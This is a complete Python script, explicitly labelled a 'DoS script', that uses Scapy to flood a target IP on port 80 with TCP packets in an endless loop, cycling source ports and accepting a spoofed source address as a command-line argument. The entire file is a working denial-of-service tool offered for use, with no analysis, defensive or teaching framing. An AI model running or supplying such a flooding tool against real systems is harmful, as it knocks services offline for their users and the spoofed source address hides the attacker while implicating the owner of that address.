from scapy.all import *
import argparse

def dos(source_IP, target_IP):
  i = 1
  
  while True:
    for source_port in range(1, 65535):
      IP1 = IP(src = source_IP, dst = target_IP)
      TCP1 = TCP(sport = source_port, dport = 80)
      pkt = IP1 / TCP1
      send(pkt, inter = .001)

      if((i % 100) == 0):
        print ("packets sent ", i)
      i = i + 1
      
if __name__ == "__main__":
  parser = argparse.ArgumentParser(description="DoS script")
  parser.add_argument("source", help="The source IP address")
  parser.add_argument("target", help="The target IP address")
  args = parser.parse_args()
  
  try:
    #run the script using the specified source and target IP addresses
    dos(args.source, args.target)
  except KeyboardInterrupt:
    print("[!] Detected CTRL+C ! quitting, please wait...")
